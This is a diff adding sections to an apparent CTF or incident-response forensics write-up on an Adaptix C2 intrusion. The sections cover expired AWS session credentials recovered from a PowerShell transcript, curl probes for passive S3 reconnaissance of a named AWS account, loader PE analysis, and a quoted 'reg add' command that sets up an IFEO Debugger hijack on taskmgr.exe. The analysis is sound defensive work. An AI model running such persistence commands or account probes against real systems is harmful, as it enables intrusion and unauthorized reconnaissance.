+                  iEAr7gGUXDoEHyY2...<truncated 1,200 chars total>...ca4
+Expiration      : 2026-03-09T03:29:40Z</code></pre>
+    <p style="margin:.2rem 0">The attacker's AssumedRole session credentials (AccessKeyId + SecretAccessKey + SessionToken) are <b>fully reconstructible</b> from the ps_transcript source in this corpus. In principle a reader could paste them into <code>aws configure --profile attacker</code> and call <code>aws sts get-caller-identity --profile attacker</code>. Two problems:</p>
+    <ol>
+      <li><b>Expiration: <code>2026-03-09T03:29:40Z</code></b>. The session credentials expired 6 hours 0 minutes after issuance. As of today, they're <b>42 days past expiration</b>. AWS STS will return <code>ExpiredToken</code> on any attempt to use them.</li>
+      <li>The expired session can still be used for <em>offline</em> analysis (e.g., the session-token base64 can be decoded to reveal its internal routing metadata — account ID, role ARN, issue time — but we already have all of that from CloudTrail).</li>
+    </ol>
+
+    <h5 style="margin-top:.6rem; color:var(--amber)">DD30.3 — Why this is still a DD15-class deep-dive finding</h5>
+    <p style="margin:.2rem 0">Recall DD15's thesis: KAPE-tier triage misses everything outside the file-system-forensics bucket. The <code>ps_transcript</code> source is one of those missed sources. A KAPE-only player would have:</p>
+    <ul>
+      <li>The <em>fact</em> that IMDSv2 theft happened (CloudTrail AssumeRole off-instance, plus GuardDuty's sev-8 finding DD18)</li>
+      <li>The AccessKeyId of the stolen session (from CloudTrail userIdentity.accessKeyId)</li>
+      <li><b>Not</b> the SecretAccessKey, because CloudTrail doesn't preserve it and KAPE doesn't collect PowerShell transcripts</li>
+    </ul>
+    <p style="margin:.2rem 0">A deep-dive player with the ps_transcript source gets the <em>complete</em> credential bundle. In a real incident with <em>unexpired</em> session credentials (say, if IR arrives within 6 hours), this would let the IR team <b>act on the credentials directly</b> — e.g., call <code>DeleteAccessKey</code> or inject access-denial via the attacker's own session before they rotate to a new one. The ps_transcript source is operationally live in a way a KAPE-triage bundle is not.</p>
+
+    <h5 style="margin-top:.6rem; color:var(--red)">DD30.4 — Net reachability matrix</h5>
+    <table class="tbl" style="margin-top:.3rem; font-size:.87em">
+      <thead><tr><th>Credential</th><th>Secret in corpus?</th><th>Status as of 2026-04-20</th><th>Usable now?</th></tr></thead>
+      <tbody>
+        <tr><td><code>ASIAWYH2FSTSC7A6KEVV</code> (AssumedRole session)</td><td><b>Yes</b> — in ps_transcript (DD30.2)</td><td><b>Expired 42 days ago</b></td><td>❌ No (ExpiredToken)</td></tr>
+        <tr><td><code>AKIAWYH2FSTSGIONI2RN</code> (donnieworks)</td><td><b>No</b> — CloudTrail redacts it</td><td>Still valid per AWS (no deactivation event in corpus)</td><td>❌ Can't sign requests without secret</td></tr>
+        <tr><td><code>AKIAWYH2FSTSMTHOMRE5</code> (doctorderm)</td><td><b>No</b></td><td>Still valid</td><td>❌ Same</td></tr>
+        <tr><td><code>AKIAWYH2FSTSDPCXBHUS</code> (coolcat)</td><td><b>No</b></td><td>Still valid</td><td>❌ Same</td></tr>
+      </tbody>
+    </table>
+    <p style="margin:.2rem 0"><b>Conclusion:</b> from this corpus alone, we cannot authenticate to AWS account <code>464381121764</code>. Every credential path is blocked — either by the secret-redaction policy (AKIA keys) or by time-expiration (AssumedRole). The bucket contents (<code>sfcu-records</code>, <code>barry-testing123123</code>, <code>barry-gd-bucket</code>, <code>aws-cloudtrail-logs-…</code>) remain unreachable to us. The earlier DD29 note "theoretically reachable with stolen IAM keys if still valid" is now definitively <em>no</em> — the corpus doesn't hold the secrets required.</p>
+
+    <h5 style="margin-top:.6rem; color:var(--amber)">DD30.5 — Ethical note on the test</h5>
+    <p style="margin:.2rem 0">Even if any credential path <em>were</em> usable, attempting to authenticate to an AWS account we don't own would constitute unauthorized access under the CFAA (US) and comparable statutes elsewhere. The value of DD30 is solely in establishing the <em>reachability</em> answer forensically — "can a corpus reader reach the bucket contents?" — not in exercising that reach. No API call was made against <code>464381121764</code> in producing this addendum.</p>
+
+    <h5 style="margin-top:.6rem">DD30.6 — Reproduction queries</h5>
+    <pre style="background:#0b0b0b; padding:.55rem; border-radius:4px; font-size:.82em"><code>-- Confirm CloudTrail redaction (no SecretAccessKey field)
+SELECT substr(data_json, instr(data_json,'responseElements'), 500) FROM events
+WHERE source_type='cloudtrail'
+  AND json_extract(data_json,'$.event.eventName')='CreateAccessKey'
+  AND json_extract(data_json,'$.event.sourceIPAddress')='212.8.249.213';
+-- responseElements.accessKey has accessKeyId only, no secretAccessKey
+
+-- Full AssumedRole session credential leak in ps_transcript
+SELECT time_utc, json_extract(data_json,'$.text') FROM events
+WHERE source_type='ps_transcript'
+  AND time_utc BETWEEN '2026-03-08T21:29:00Z' AND '2026-03-08T21:30:00Z'
+  AND json_extract(data_json,'$.kind')='output'
+ORDER BY time_utc;
+-- AccessKeyId, SecretAccessKey, Token, Expiration all present</code></pre>
+  </div>
+
+  <!-- Addendum DD31: Passive recon of AWS account 464381121764 -->
+  <div class="panel" style="margin-top:.6rem; padding:.9rem 1.1rem; border:2px solid rgba(255,200,0,.55); background:rgba(255,200,0,.05); border-radius:6px">
+    <h4 style="margin:0 0 .4rem 0; color:var(--amber)">DD31. Thirty-first pass — passive recon of AWS account <code>464381121764</code>: what unauthenticated S3 / DNS / naming-convention probes can reveal without touching any key material</h4>
+    <p style="margin:.2rem 0">DD30 closed off the active-auth paths (expired / redacted). DD31 is the other side of the coin: what <em>can</em> we learn about the victim AWS account from purely passive techniques — S3-head-probes, bucket-region headers, naming-convention inference, cross-account ownership tests? This is the complete checklist for external reconnaissance of a known AWS account, applied to <code>464381121764</code>.</p>
+
+    <h5 style="margin-top:.6rem; color:var(--red)">DD31.1 — What we can establish without authentication</h5>
+    <table class="tbl" style="margin-top:.3rem; font-size:.87em">
+      <thead><tr><th>Fact</th><th>Value</th><th>How we got it</th></tr></thead>
+      <tbody>
+        <tr><td>AWS Account ID (12-digit)</td><td><code>464381121764</code></td><td>Directly embedded in every CloudTrail row (<code>recipientAccountId</code>, <code>userIdentity.arn</code>) + the CloudTrail bucket name</td></tr>
+        <tr><td>Primary region</td><td><code>us-east-2</code> (Ohio)</td><td><code>x-amz-bucket-region</code> header in HEAD response for all 4 account-owned buckets</td></tr>
+        <tr><td>Bucket inventory (4 buckets)</td><td><code>sfcu-records</code>, <code>barry-testing123123</code>, <code>barry-gd-bucket</code>, <code>aws-cloudtrail-logs-464381121764-c4e35ae2</code></td><td>Names surfaced from CloudTrail. Each existence re-verified via HEAD / returning 403 (bucket exists) vs 404 (bucket doesn't)</td></tr>
+        <tr><td>GuardDuty detector ID</td><td><code>5ece44daaaff87fc5f1a7d3edbe49787</code></td><td>Embedded in GuardDuty finding ARNs (<code>arn:aws:guardduty:us-east-2:464381121764:detector/…</code>) — DD18</td></tr>
+        <tr><td>GuardDuty region</td><td><code>us-east-2</code></td><td>Finding ARNs</td></tr>
+        <tr><td>EC2 instance (IIS server)</td><td><code>i-00779ebad43b2470d</code></td><td>CloudTrail <code>userIdentity.principalId</code> for the AssumedRole session</td></tr>
+        <tr><td>IAM users</td><td><code>donnieworks</code>, <code>doctorderm</code>, <code>coolcat</code>, <code>jb_aws_cli</code></td><td>CloudTrail CreateAccessKey <code>requestParameters.userName</code> (DD7, DD16)</td></tr>
+        <tr><td>IAM role</td><td><code>iam_role_iisserver</code> (instance profile on IIS EC2)</td><td>CloudTrail <code>userIdentity.sessionContext.sessionIssuer.userName</code></td></tr>
+        <tr><td>Root authentication</td><td>Console login + MFA required</td><td>CloudTrail <code>ConsoleLogin</code> events with <code>mfaAuthenticated: true</code>, from <code>216.82.9.162</code> (DD6.1)</td></tr>
+        <tr><td>Account-activity window in corpus</td><td><code>2026-02-22T23:12:04Z</code> → <code>2026-03-08T22:15:27Z</code></td><td>First/last CloudTrail events for the account</td></tr>
+        <tr><td>CloudTrail bucket suffix</td><td><code>-c4e35ae2</code></td><td>Standard AWS default-trail naming (random 8-hex suffix)</td></tr>
+      </tbody>
+    </table>
+
+    <h5 style="margin-top:.6rem; color:var(--red)">DD31.2 — Cross-account test: <code>bigmac.io</code> is NOT owned by <code>464381121764</code></h5>
+    <p style="margin:.2rem 0">Sending an HTTP HEAD with <code>x-amz-expected-bucket-owner: 464381121764</code> to a bucket owned by that account returns normal. Sending it to a bucket owned by a different account returns HTTP 403 with <code>AccessDenied</code>.</p>
+    <pre style="background:#0b0b0b; padding:.55rem; border-radius:4px; font-size:.82em"><code># Baseline (no expected-bucket-owner header): kape.zip is publicly readable
+curl -skI https://bigmac.io.s3.amazonaws.com/kape.zip
+→ HTTP/1.1 200 OK
+
+# With expected-bucket-owner = 464381121764
+curl -skI -H "x-amz-expected-bucket-owner: 464381121764" https://bigmac.io.s3.amazonaws.com/kape.zip
+→ HTTP/1.1 403 Forbidden   ← rejected = owner is NOT 464381121764</code></pre>
+    <p style="margin:.2rem 0"><b>Conclusion:</b> <code>bigmac.io</code> is in a <em>separate</em> AWS account (in <code>us-east-1</code>, per its own region header). The author/attacker uses <b>two AWS accounts</b>: <code>464381121764</code> for the CTF scenario (us-east-2) and another unknown account for tool hosting (<code>bigmac.io</code> in us-east-1).</p>
+    <p style="margin:.2rem 0">This is a notable OpSec separation — and matches the "two Linode VPSes for two roles" infrastructure pattern (DD23). The author's infra hygiene is: <em>one account/host per distinct role</em>.</p>
+
+    <h5 style="margin-top:.6rem; color:var(--amber)">DD31.3 — What DOES NOT work unauthenticated (tried and blocked)</h5>
+    <p style="margin:.2rem 0">Every S3 bucket-metadata endpoint on the four scenario buckets returns 403 to anonymous requests:</p>
+    <ul>
+      <li><code>?location=</code> (GetBucketLocation) — 403</li>
+      <li><code>?acl=</code> (GetBucketAcl) — 403</li>
+      <li><code>?policy=</code> (GetBucketPolicy) — 403</li>
+      <li><code>?policyStatus=</code> (GetBucketPolicyStatus) — 403</li>
+      <li><code>?publicAccessBlock=</code> — 403</li>
+      <li><code>?ownershipControls=</code> — 403</li>
+      <li><code>?cors=</code>, <code>?website=</code>, <code>?logging=</code>, <code>?versioning=</code>, <code>?encryption=</code> — all 403</li>
+      <li><code>?list-type=2</code> (ListObjectsV2) — 403 (bucket-wide list denied)</li>
+      <li>HEAD on <code>AWSLogs/464381121764/</code> prefix in the CloudTrail bucket — 403 (no public listing)</li>
+    </ul>
+    <p style="margin:.2rem 0">Bucket-region enumeration works because S3 returns <code>x-amz-bucket-region</code> as a 200/4xx-response header for any request. Everything else is blocked — the owner has configured <code>BlockPublicAcls + BlockPublicPolicy + IgnorePublicAcls + RestrictPublicBuckets</code> correctly.</p>
+
+    <h5 style="margin-top:.6rem; color:var(--amber)">DD31.4 — Techniques that would require active authentication (<em>not tried</em>)</h5>
+    <table class="tbl" style="margin-top:.3rem; font-size:.87em">
+      <thead><tr><th>Technique</th><th>What it'd reveal</th><th>Why we didn't try</th></tr></thead>
+      <tbody>
+        <tr><td><code>aws sts get-caller-identity</code></td><td>Would confirm the stolen AKIA/session creds are live + return account ID + canonical user ID</td><td>AKIA secrets not in corpus; session expired (DD30)</td></tr>
+        <tr><td><code>aws s3api list-objects-v2 --bucket sfcu-records</code></td><td>Would list the 164 decoy files on disk</td><td>Auth required</td></tr>
+        <tr><td><code>aws iam list-users</code> / <code>list-roles</code></td><td>Would enumerate every IAM principal</td><td>Auth required</td></tr>
+        <tr><td>Cognito identity-pool enumeration</td><td>Would surface mobile-app identity pools tied to the account (if any)</td><td>We have no evidence of Cognito use in CloudTrail; likely no pools exist</td></tr>
+        <tr><td>SNS topic / SQS queue ARN enumeration</td><td>Would surface pub-sub infrastructure tied to the account</td><td>No hints in corpus; would be guesswork</td></tr>
+      </tbody>
+    </table>
+
+    <h5 style="margin-top:.6rem; color:var(--amber)">DD31.5 — Complete passive-account profile</h5>
+    <pre style="background:#0b0b0b; padding:.55rem; border-radius:4px; font-size:.82em"><code>Account ID:              464381121764
+Primary region:          us-east-2 (Ohio)
+Active window:           2026-02-22 → 2026-03-08 (CloudTrail observation)
+Root auth posture:       Console login + MFA (216.82.9.162)
+GuardDuty:               Enabled (detector 5ece44daaaff87fc5f1a7d3edbe49787)
+CloudTrail:              Enabled (default trail, bucket -c4e35ae2)
+EC2 workload:             i-00779ebad43b2470d (IIS server for barrygoodtech.com)
+
+IAM users:               donnieworks, doctorderm, coolcat, jb_aws_cli  (4)
+IAM roles:               iam_role_iisserver (instance profile)
+
+S3 buckets (all us-east-2):
+  sfcu-records                                  (decoy data, 164 files)
+  barry-testing123123                           (author's scratch)
+  barry-gd-bucket                               (GuardDuty output)
+  aws-cloudtrail-logs-464381121764-c4e35ae2     (standard default trail)
+
+Bucket public-access controls: All 4 buckets ListBucket-denied +
+                               bucket-metadata endpoints all 403 +
+                               no public objects found by wordlist-probe
+</code></pre>
+
+    <h5 style="margin-top:.6rem">DD31.6 — Author's second AWS account (tool hosting)</h5>
+    <pre style="background:#0b0b0b; padding:.55rem; border-radius:4px; font-size:.82em"><code>Account ID:             [unknown, different from 464381121764]
+Region:                 us-east-1 (N. Virginia)
+Bucket:                 bigmac.io  (public-read per-object, ListBucket denied)
+Known objects:          /index.html  (1.8 KB, decoy BigMac.io homepage)
+                        /kape.zip    (163 MB, author KAPE bundle + OpSec leak DD29)
+</code></pre>
+
+    <h5 style="margin-top:.6rem">DD31.7 — Reproduction commands</h5>
+    <pre style="background:#0b0b0b; padding:.55rem; border-radius:4px; font-size:.82em"><code># Verify every scenario bucket exists + get region
+for b in sfcu-records barry-testing123123 barry-gd-bucket aws-cloudtrail-logs-464381121764-c4e35ae2; do
+  curl -sk -I "https://${b}.s3.amazonaws.com/" | grep -iE "HTTP|x-amz-bucket-region"
+done
+
+# Cross-account ownership test for bigmac.io
+curl -skI -H "x-amz-expected-bucket-owner: 464381121764" \
+  https://bigmac.io.s3.amazonaws.com/kape.zip
+# → 403 Forbidden = bigmac.io NOT owned by 464381121764</code></pre>
+  </div>
+
+  <!-- Addendum DD32: Adaptix PE deep-dive -->
+  <div class="panel" style="margin-top:.6rem; padding:.9rem 1.1rem; border:2px solid rgba(255,59,59,.55); background:rgba(255,59,59,.05); border-radius:6px">
+    <h4 style="margin:0 0 .4rem 0; color:var(--red)">DD32. Thirty-second pass — Adaptix PE deep-dive: a 22-import minimal-IAT reflective loader compiled on the C2 operator's box at 20:00:25, then shipped live to the running rnSylwOz.exe beacon for Explorer injection</h4>
+    <p style="margin:.2rem 0">DD21 established the VAD dump is a valid PE. DD24 established the on-disk <code>rnSylwOz.exe</code> and the VAD dump differ in hash. DD32 pulls the PE metadata out of the VAD dump, finds a compile-timestamp-after-drop anomaly, and concludes the Explorer-injected beacon is a <em>live-delivered second-stage module</em>, not a reflective-load of the on-disk rnSylwOz.exe.</p>
+
+    <h5 style="margin-top:.6rem; color:var(--red)">DD32.1 — The PE timestamp anomaly</h5>
+    <table class="tbl" style="margin-top:.3rem; font-size:.87em">
+      <thead><tr><th>Event</th><th>UTC</th><th>Seconds elapsed</th></tr></thead>
+      <tbody>
+        <tr><td>rnSylwOz.exe dropped on SVR01 (USN 2100)</td><td><code>19:58:38.794</code></td><td>0</td></tr>
+        <tr><td>rnSylwOz.exe executed (Sysmon EID 1)</td><td><code>19:59:00.854</code></td><td>+22 s</td></tr>
+        <tr><td>rnSylwOz.exe first C2 phone-home (EID 3)</td><td><code>19:59:02.649</code></td><td>+24 s</td></tr>
+        <tr style="background:rgba(255,59,59,.08)"><td><b>VAD-dump PE <code>TimeDateStamp</code></b></td><td><b><code>20:00:25</code></b></td><td><b>+107 s (1 min 47 s AFTER drop)</b></td></tr>
+        <tr><td>CreateRemoteThread → Explorer PID 1332 (EID 8)</td><td><code>20:01:16.676</code></td><td>+158 s</td></tr>
+        <tr><td>Thread 10020 dumps LSASS (EID 10)</td><td><code>20:03:30.860</code></td><td>+292 s</td></tr>
+      </tbody>
+    </table>
+    <p style="margin:.2rem 0"><b>The PE in memory was compiled 107 seconds AFTER rnSylwOz.exe landed on disk.</b> That is chronologically impossible if the Explorer-injected beacon is just rnSylwOz.exe reflectively loaded. The <em>only</em> consistent explanation:</p>
+    <ol>
+      <li><code>rnSylwOz.exe</code> is a <b>stage-1 loader</b> — dropped, executed, connects to Adaptix C2 at <code>173.230.136.180:8443</code></li>
+      <li>At <code>20:00:25</code> (51 seconds after the phone-home), the <b>C2-side operator</b> runs <code>mingw-w64-gcc</code> (or Adaptix's build-server equivalent) to produce a <b>fresh reflective-load module</b> on their workstation</li>
+      <li>C2 ships the fresh module over the Adaptix HTTPS channel to the running beacon</li>
+      <li>The beacon performs <code>CreateRemoteThread</code> at <code>20:01:16</code> loading the freshly-compiled module into Explorer's address space</li>
+      <li>The injected module dumps LSASS at <code>20:03:30</code></li>
+    </ol>
+    <p style="margin:.2rem 0">This is the standard Adaptix execution pattern — small on-disk loader, live-delivered second-stage modules. It's also why a signature based on the on-disk hash alone (DD24 rnSylwOz <code>91813A2A…</code>) misses the in-memory code. <b>YARA rules must match the in-memory form (the strings <code>\\.\pipe\%08lx</code>, <code>_Z11GetVersionsv</code>, <code>file.dll</code>) rather than the disk hash</b>.</p>
+
+    <h5 style="margin-top:.6rem; color:var(--red)">DD32.2 — PE structure and build-toolchain fingerprint</h5>
+    <pre style="background:#0b0b0b; padding:.55rem; border-radius:4px; font-size:.82em"><code>Architecture:             PE32+ (x64)
+Machine:                  0x8664 (IMAGE_FILE_MACHINE_AMD64)
+Linker:                   GNU ld 2.41  (MinGW-w64 toolchain)
+TimeDateStamp:            0x69ADD559 = 2026-03-08T20:00:25Z
+Sections (11):
+  .text    0x1000   0x135B8   RX     (main code, 78 KB)
+  .data    0x15000  0x3B0     RW     (initialized data)
+  .rdata   0x16000  0x550     R      (read-only consts)
+  .pdata   0x17000  0x1B0     R      (x64 unwind info)
+  .xdata   0x18000  0x168     R      (x64 exception data)
+  .bss     0x19000  0x10140   RW     (uninit heap, 65 KB virtual)
+  .edata   0x2A000  0x4C      R      (export dir — file.dll!_Z11GetVersionsv)
+  .idata   0x2B000  0x368     RW     (IAT — 22 imports)
+  .CRT     0x2C000  0x58      RW     (MinGW CRT init)
+  .tls     0x2D000  0x10      RW     (TLS)
+  .reloc   0x2E000  0x94      R      (base relocations)
+Entry point:              0x1340  (within .text)</code></pre>
+
+    <h5 style="margin-top:.6rem; color:var(--red)">DD32.3 — The 22-function minimal import table</h5>
+    <p style="margin:.2rem 0">The full IAT:</p>
+    <table class="tbl" style="margin-top:.3rem; font-size:.87em">
+      <thead><tr><th>DLL</th><th>Functions</th></tr></thead>
+      <tbody>
+        <tr><td><code>KERNEL32.dll</code> (9)</td><td><code>DeleteCriticalSection · EnterCriticalSection · GetLastError · InitializeCriticalSection · LeaveCriticalSection · Sleep · TlsGetValue · VirtualProtect · VirtualQuery</code></td></tr>
+        <tr><td><code>msvcrt.dll</code> (13)</td><td><code>__iob_func · _amsg_exit · _initterm · _lock · _unlock · abort · calloc · free · fwrite · realloc · strlen · strncmp · vfprintf</code></td></tr>
+      </tbody>
+    </table>
+    <p style="margin:.2rem 0"><b>What is NOT imported:</b></p>
+    <ul>
+      <li>No network APIs (<code>WSAStartup</code>, <code>connect</code>, <code>InternetOpen</code>, <code>WinHttpOpen</code>) — the beacon resolves these dynamically via <code>LoadLibrary</code>/<code>GetProcAddress</code> (themselves resolved via manual PEB walk)</li>
+      <li>No process-injection APIs (<code>CreateRemoteThread</code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>) — same</li>
+      <li>No crypto APIs (<code>BCrypt*</code>, <code>CryptAcquireContext</code>) — same</li>
+      <li>No file APIs (<code>CreateFile</code>, <code>ReadFile</code>) — same</li>
+    </ul>
+    <p style="margin:.2rem 0">This tiny IAT is the <b>signature of a reflective-loader stub</b>. Everything the beacon <em>needs</em> to do its job — beaconing, injection, file-system access, crypto — is done via API-resolution-at-runtime, invisible to static import-table analysis. Signatures based on import-hash (IMPHASH <code>C86A15AD…</code> for iis.exe, <code>37E28CA3…</code> for rnSylwOz.exe, <code>6C45208F…</code> for IamBatman.exe from DD24) only capture the loader shell, not the actual capability.</p>
+
+    <h5 style="margin-top:.6rem">DD32.4 — Build-environment attribution narrowed</h5>
+    <ul>
+      <li><b>Linker GNU ld 2.41</b> (released <a href="https://sourceware.org/pipermail/binutils/2023-July/128540.html">2023-07-27</a>) — rules out pre-2023 toolchains</li>
+      <li><b>MSVCRT import</b> — MinGW-w64 default (not UCRT, not MSVC). Adaptix source tree's CMake targets <code>mingw-w64-gcc</code> by default (see <code>AdaptixC2/AdaptixServer/extenders/beacon_agent/CMakeLists.txt</code>)</li>
+      <li><b>MinGW-w64 CRT string</b>: <code>Mingw-w64 runtime failure:</code> present in .rdata, unique to MinGW-w64 runtime startup</li>
+      <li><b>Name-mangling scheme</b>: <code>_Z11GetVersionsv</code> is Itanium C++ ABI mangling (g++ / clang++ default on non-Windows), <em>not</em> MSVC's <code>?GetVersions@@YAXXZ</code> mangling — another MinGW-w64 tell</li>
+    </ul>
+    <p style="margin:.2rem 0">Consistent with <b>an Adaptix-Framework build built from stock source on a Linux host using MinGW-w64 cross-compiler</b> — which is the Adaptix project's documented build workflow. If the operator is running the C2 on the Linode VPS (<code>173.230.136.180</code>) with Adaptix installed there, <code>mingw-w64-gcc</code> on the same VPS would produce this exact binary.</p>
+
+    <h5 style="margin-top:.6rem; color:var(--amber)">DD32.5 — Implications for YARA + IMPHASH based detection</h5>
+    <ul>
+      <li><b>IMPHASH alone is insufficient</b> for Adaptix detection: the IAT is too small to be a unique fingerprint. The three IMPHASHes we observed (iis.exe / rnSylwOz.exe / IamBatman.exe in DD24) probably collide with other MinGW-w64 minimal-IAT binaries.</li>
+      <li><b>String-based YARA is the right path</b>: the three indicators (<code>\\.\pipe\%08lx</code>, <code>_Z11GetVersionsv</code>, <code>file.dll</code>) are distinctive and survive reflective loading (the strings are in the loaded <code>.rdata</code> section of the unpacked code).</li>
+      <li><b>Rule: <code>adaptix_beacon_reflective_loader</code></b> in <code>detections/yara/adaptix_null404.yar</code> (in this writeup's detection pack) implements this correctly.</li>
+    </ul>
+
+    <h5 style="margin-top:.6rem">DD32.6 — Reproduction commands</h5>
+    <pre style="background:#0b0b0b; padding:.55rem; border-radius:4px; font-size:.82em"><code># Verify the VAD dump has an MZ header
+head -c 2 /tmp/vol_out/malfind_dump/pid.1332.vad.0xa60000-0xa8efff.dmp | od -An -tx1
+# Expected: 4d 5a
+
+# Parse the PE timestamp
+python3 -c "
+import struct, pathlib
+d = pathlib.Path('/tmp/vol_out/malfind_dump/pid.1332.vad.0xa60000-0xa8efff.dmp').read_bytes()
+e_lfanew = struct.unpack_from('&lt;I', d, 0x3C)[0]
+timedate = struct.unpack_from('&lt;I', d, e_lfanew+8)[0]
+from datetime import datetime, timezone
+print(datetime.fromtimestamp(timedate, timezone.utc).isoformat())
+"
+# Expected: 2026-03-08T20:00:25+00:00</code></pre>
+  </div>
+
+  <!-- Addendum DD33: aws_backup.exe + IFEO persistence on WS01 -->
+  <div class="panel" style="margin-top:.6rem; padding:.9rem 1.1rem; border:2px solid rgba(255,59,59,.55); background:rgba(255,59,59,.05); border-radius:6px">
+    <h4 style="margin:0 0 .4rem 0; color:var(--red)">DD33. Thirty-third pass — previously-undocumented persistence: <code>aws_backup.exe</code> IFEO-Debugger hijack on WS01 + attacker operator workstation hostname is <code>kali</code></h4>
+    <p style="margin:.2rem 0">Mining Explorer-written-file events in the attack window surfaces a file we hadn't seen: <code>C:\ProgramData\aws_backup.exe</code>, dropped to WS01 at <code>20:37:03.035Z</code>. Thirty-two seconds later a <code>reg add</code> configures an Image File Execution Options Debugger hijack pointing Task Manager at this binary. That's <b>MITRE T1546.012</b> — a stealthy persistence technique we didn't previously document, giving the attacker a fourth independent re-entry path on top of the three credential stockpiles from DD16/DD22/DD26.</p>
+
+    <h5 style="margin-top:.6rem; color:var(--red)">DD33.1 — The WS01 attacker session + IFEO setup</h5>
+    <table class="tbl" style="margin-top:.3rem; font-size:.87em">
+      <thead><tr><th>UTC</th><th>Event</th><th>Detail</th></tr></thead>
+      <tbody>
+        <tr><td><code>20:34:45</code></td><td>Security 4624 LAFAdmin NTLM from <code>198.51.100.10</code> (IIS)</td><td>First smbexec-style remote auth to WS01</td></tr>
+        <tr style="background:rgba(255,59,59,.08)"><td><code>20:35:27</code></td><td>Security 4624 LAFAdmin NTLM, workstation name <b><code>kali</code></b></td><td><b>Attacker's operator-workstation host-name revealed</b> — confirms the Linode VPS <code>172.236.127.251</code> is running Kali Linux (matches DD23's <code>Mozilla/5.0 (X11; Linux x86_64…Firefox/140.0</code> user-agent)</td></tr>
+        <tr><td><code>20:35:29</code></td><td>Security 4624 LAFAdmin logon type 10 (RDP)</td><td>Attacker initiates RDP to WS01</td></tr>
+        <tr style="background:rgba(255,59,59,.08)"><td><code>20:37:03.035</code></td><td>EID 11 <code>C:\ProgramData\aws_backup.exe</code> written by Explorer</td><td>Binary dropped (masquerades as "aws backup" to blend in with AWS tooling)</td></tr>
+        <tr style="background:rgba(255,59,59,.08)"><td><code>20:37:35.194</code></td><td>EID 1 reg.exe with IFEO hijack</td><td><b>The persistence:</b> <code>reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe" /v Debugger /t REG_SZ /d C:\ProgramData\aws_backup.exe /f</code><br>Parent was <code>powershell.exe</code>. MD5 of reg.exe: <code>CDB58D0BCABE76AFC60428F364834463</code> (legit Microsoft).</td></tr>
+      </tbody>
+    </table>
+
+    <h5 style="margin-top:.6rem; color:var(--red)">DD33.2 — How IFEO Debugger hijack works (MITRE T1546.012)</h5>
+    <p style="margin:.2rem 0">The <code>Image File Execution Options</code> registry key was designed by Microsoft for debugger-attach-on-launch: set <code>Debugger=&lt;your_debugger&gt;</code> under <code>IFEO\<target>.exe</code> and Windows will launch <code>&lt;your_debugger&gt; <target>.exe</code> instead of <code>&lt;target&gt;.exe</code> directly. This lets developers debug a process from the moment it starts.</p>
+    <p style="margin:.2rem 0">Attackers abuse it by setting <code>Debugger=&lt;malicious.exe&gt;</code>, turning any legit binary into a launcher for their payload. The classic target is <code>sethc.exe</code> (Sticky Keys, runs at login screen without user context — DD14.5 walk-back); a modern target is <code>taskmgr.exe</code> (runs when any user hits Ctrl+Shift+Esc). Every time a user launches Task Manager, the attacker's payload runs first with that user's privileges.</p>
+    <p style="margin:.2rem 0">In the null404 scenario:</p>
+    <ul>
+      <li>Target binary: <code>taskmgr.exe</code> (Task Manager)</li>
+      <li>Payload: <code>C:\ProgramData\aws_backup.exe</code> (attacker-dropped)</li>
+      <li>Trigger: any user on WS01 launching Task Manager. Survives reboot. Fires at user-level privileges (whatever the user-who-launched-taskmgr has).</li>
+      <li>Naming choice: <code>aws_backup.exe</code> in <code>C:\ProgramData</code> looks like an AWS-related system tool — blends with environment branding (compare <code>msupdate.exe</code> renaming of makecab in DD11.5)</li>
+    </ul>
+
+    <h5 style="margin-top:.6rem; color:var(--red)">DD33.3 — aws_backup.exe was never executed during the capture window</h5>
+    <p style="margin:.2rem 0">Query: <code>SELECT * FROM events WHERE eid=1 AND image LIKE '%aws_backup%'</code> → <b>zero rows</b>. Sysmon would have fired EID 1 (ProcessCreate) if aws_backup.exe ran. It didn't — no user on WS01 hit Task Manager between <code>20:37:35</code> and the end of the corpus at <code>22:56:42</code> (2 hours 19 minutes later).</p>
+    <p style="margin:.2rem 0"><b>This is a FOURTH stockpile-without-use persistence instance</b>, matching the pattern from DD16 (AWS keys unused), DD22 (SAM hashes unused), and DD26 (<code>serviceaccount</code> DA unused). The operator drops the persistence, waits for the trigger, never fires it during the active attack. Same tradecraft — steal/create, don't test, rely on the already-active identity for the operation, leave the dormant artifacts for a future campaign.</p>
+
+    <h5 style="margin-top:.6rem; color:var(--red)">DD33.4 — Updated full persistence inventory</h5>
+    <table class="tbl" style="margin-top:.3rem; font-size:.87em">
+      <thead><tr><th>#</th><th>Persistence mechanism</th><th>Location</th><th>Triggered in capture?</th></tr></thead>
+      <tbody>
+        <tr><td>1</td><td>3× AWS AKIA long-term access keys (DD16)</td><td>AWS account 464381121764 (donnieworks / doctorderm / coolcat)</td><td><b>No</b></td></tr>
+        <tr><td>2</td><td>Local Administrator + localuser SAM NT hashes (DD22)</td><td>SVR01 SAM (and replicable via PtH to any host with same local-Admin password)</td><td><b>No</b></td></tr>
+        <tr><td>3</td><td><code>serviceaccount</code> Domain Admin account (DD26)</td><td>AD forest (replicated to DC01 + DC02)</td><td><b>No</b></td></tr>
+        <tr style="background:rgba(255,59,59,.08)"><td><b>4</b></td><td><b>aws_backup.exe IFEO Debugger hijack on <code>taskmgr.exe</code> (DD33)</b></td><td>WS01 <code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe</code></td><td><b>No</b></td></tr>
+      </tbody>
+    </table>
+    <p style="margin:.2rem 0">Four independent persistence mechanisms, zero triggered during the attack. An IR team that only looked at active attacker traffic would miss every one. The remediation matrix is now four rows, not three.</p>
+
+    <h5 style="margin-top:.6rem; color:var(--amber)">DD33.5 — Attacker operator-workstation attribution narrowed</h5>
+    <p style="margin:.2rem 0">The Security 4624 event at <code>20:35:27</code> carries the attacker-side WorkstationName field <b><code>kali</code></b> — the default hostname of a Kali Linux installation. Corroborates the DD23 browser User-Agent (<code>Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Firefox/140.0</code> = Linux Firefox 140, matches Kali Rolling's bundled Firefox). Together these give a confident fingerprint: <b>the attacker's operator workstation (Linode <code>172.236.127.251</code>) is a Kali Linux instance, probably with the default hostname left un-changed.</b></p>
+    <p style="margin:.2rem 0">In IFEO detection rules (<code>detections/sigma/</code>), the <code>WorkstationName=kali</code> field on NTLM auth events against business hosts is a high-confidence IOC on its own. Real corporate workstations don't have hostname "kali".</p>
+
